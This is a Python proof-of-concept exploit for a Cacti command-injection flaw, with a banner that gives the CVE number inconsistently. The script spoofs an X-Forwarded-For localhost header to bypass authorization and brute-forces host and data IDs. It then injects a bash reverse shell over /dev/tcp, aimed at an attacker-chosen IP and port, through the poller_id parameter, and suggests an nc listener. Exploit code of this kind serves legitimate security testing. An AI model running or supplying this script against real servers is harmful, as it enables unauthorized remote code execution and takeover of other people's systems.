import argparse
import json
import re
import requests
import rich
import sys
import urllib
from typing import Tuple

ASCII_ART = """
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗ ██████╗ ██╗ ██████╗ █████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║██╔════╝███║██╔════╝██╔══██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║███████╗╚██║███████╗╚██████║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ██╔═══╝ ╚════╝╚════██║██╔═══██╗██║██╔═══██╗╚═══██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗███████╗           ██║╚██████╔╝██║╚██████╔╝█████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚══════╝           ╚═╝ ╚═════╝ ╚═╝ ╚═════╝ ╚════╝
PoC for [bold yellow]CVE-2023-46169[/bold yellow] - Cacti Version < [bold yellow]1.2.22[/bold yellow]
"""

REVERSE_SHELL_FMT = "{shell} -c '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'"
URL_FMT = "/remote_agent.php?action=polldata&poller_id={poll_id}&host_id={host_id}&local_data_ids[]={data_id}"
HEADERS = {"X-Forwarded-For": "127.0.0.1"}

# ---------------------------------------------------------------------------------------------------------------------
def error(txt: str):
    rich.print(f"[red][-] Error: [/red]{txt}")
    sys.exit(1)

# ---------------------------------------------------------------------------------------------------------------------
def status(txt: str, prefix=""):
    rich.print(prefix + f"[blue][*][/blue] {txt}")

# ---------------------------------------------------------------------------------------------------------------------
def success(txt: str, prefix=""):
    rich.print(prefix + f"[green][+][/green] {txt}")

# ---------------------------------------------------------------------------------------------------------------------
def force_ids(url: str) -> Tuple[str, int, int]:
    for host_id in range(1,20):
        for data_id in range(1,20):
            brute_url = url +  URL_FMT.format(poll_id="1", host_id=host_id, data_id=data_id)
            resp = requests.get(brute_url, headers = HEADERS)
            if resp.text is not None and resp.text != "[]":
                data = json.loads(resp.text)[0]
                name = data["rrd_name"]
                if name in ["polling_time", "uptime"]:
                    return name, host_id, data_id
    error("Unable to Brute-Force ID's")

# ---------------------------------------------------------------------------------------------------------------------
def cli():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Shell Callback IP Address/Host")
    parser.add_argument('port', type=int, help="Shell Callback Port")
    parser.add_argument('-u', '--url', required=True, help="Cacti Server URL")
    parser.add_argument('-s', '--shell', default="/bin/bash", help="Remote Shell (default: /bin/bash)")
    args = parser.parse_args()
    rich.print(ASCII_ART)

    status(f"Listener       : [bold cyan]nc -nvlp {args.port}[/bold cyan]")

    try:
        match = re.search(r"cactiVersion='([^']*)'", requests.get(args.url).text)
        if match is None:
            error("Failed to locate version from Cacti Main Page")
        version = match.groups(0)[0]
        major, minor, build = [int(x) for x in version.split('.')]
        if major > 1 or minor > 2 or build > 22:
            error(f"Server Version : {version} (not vulnerable)")
        status(f"Server Version : {version} [green](vulnerable)[/green]") 
    except Exception as e:
        error(f"Failed to get server version: {e}")

    status("Brute Forcing ID's")
    name, host_id, data_id = force_ids(args.url)
    status(f"RRD Name      : {name}", prefix="\t")
    status(f"Host ID       : {host_id}", prefix="\t")
    status(f"Local Data ID : {data_id}", prefix="\t")

    rev_shell = REVERSE_SHELL_FMT.format(shell=args.shell, ip=args.ip, port=args.port)
    payload = urllib.parse.quote(rev_shell)

    status("Sending Payload....")
    resp = requests.get(args.url + URL_FMT.format(poll_id=";" + payload, host_id=host_id, data_id=data_id), headers=HEADERS)
    if resp.status_code == 200:
        success("PAYLOAD SENT")
    else:
        error(resp.text)

# ---------------------------------------------------------------------------------------------------------------------
if __name__ == '__main__':
    cli()
